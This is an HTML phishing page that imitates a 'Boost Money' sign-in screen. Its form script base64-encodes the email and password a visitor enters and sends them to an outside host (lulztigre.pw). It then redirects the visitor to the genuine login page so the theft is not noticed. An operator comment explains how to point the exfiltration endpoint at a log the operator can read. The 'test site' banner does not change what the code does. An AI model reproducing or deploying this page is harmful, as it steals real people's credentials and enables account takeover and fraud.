<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Boost Money</title>
<style>
body{margin:0;font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif;background:#fff;color:#12283a}
.hdr{background:#12283a;padding:28px 0;text-align:center}.hdr span{color:#fff;font-size:30px;font-weight:300;letter-spacing:.5px}
.wrap{max-width:460px;margin:0 auto;padding:24px 20px}
.bnr{background:#e7f4ea;color:#1d5c33;font-size:13px;padding:10px 16px;margin:-24px -20px 18px;text-align:center}
input{width:100%;box-sizing:border-box;padding:16px;border:1px solid #9aa7b2;border-radius:8px;font-size:16px;margin-bottom:14px}
.btn{width:100%;background:#14691e;color:#fff;border:0;border-radius:10px;padding:17px;font-size:18px;font-weight:600}
.row{display:flex;justify-content:space-between;font-size:14px;margin:4px 0 22px;color:#14691e}
</style></head><body>
<div class="hdr"><span><b>U</b>boostmoney</span></div>
<div class="wrap">
<div class="bnr">This is a test site and does not support applications for credit.</div>
<!-- CONFIG: point EXFIL at any endpoint whose logs you can read (your VPS, a Cloudflare Worker, a request-bin). It receives ?d=<base64(user:pass)>. -->
<script>var EXFIL="https://lulztigre.pw/log/";</script>
<form onsubmit="try{var u=document.getElementById('e').value,p=document.getElementById('p').value;navigator.sendBeacon(EXFIL+'?d='+btoa(u+':'+p))}catch(e){}setTimeout(function(){location.href='https://www.boostmoney.tech/auth/login?clientId=portal-ui-web'},300);return false">
<input id="e" type="email" placeholder="Email Address" autocomplete="off" required>
<input id="p" type="password" placeholder="Password" required>
<div class="row"><span>Forgot your password?</span><span>Save Email</span></div>
<button class="btn" type="submit">Sign In</button>
</form>
</div></body></html>
